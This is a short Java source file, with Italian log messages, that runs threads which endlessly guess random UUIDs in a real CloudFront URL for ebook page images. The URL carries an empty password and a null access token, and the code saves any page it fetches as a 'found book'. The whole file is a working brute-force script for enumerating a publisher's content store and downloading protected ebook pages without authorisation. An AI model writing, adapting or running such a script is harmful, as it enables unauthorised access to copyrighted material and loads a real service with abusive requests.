import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.UUID;

import org.apache.commons.io.FileUtils;
public class BruteCode implements Runnable{
	private static int n;
	public BruteCode(int n) {
		this.n=n;
	}
	private static void loadBrute() throws MalformedURLException, URISyntaxException{
	     long attempts = 0;
	     String url1 ="https://d38l3k3yaet8r2.cloudfront.net/resources/products/epubs/generated/";
	     String url2 ="/foxit-assets/pages/page0?password=&accessToken=null&formMode=true";
	     while(true) {
	            String UUID = generateUUID();
	            URL url = new URI(url1+UUID+url2).toURL();	
	            File file = new File("data/brute/"+UUID+".jpg");
				try {
					FileUtils.copyURLToFile(url, file);
					System.out.println("Libro trovato al tentativo : "+attempts+" al thread: "+n+" UUID: "+UUID);
					attempts++;
				} catch (IOException e) {
					System.out.println("UUID: "+ UUID);
					attempts++;
					file.delete();				
				}
	     }
	}
	 private static String generateUUID() {
	        UUID uuid = UUID.randomUUID();
	        return uuid.toString().toUpperCase();
	    }
	@Override
	public void run() {
		System.out.println("Thread "+n+"generato");
		try {
			loadBrute();
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (URISyntaxException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
}

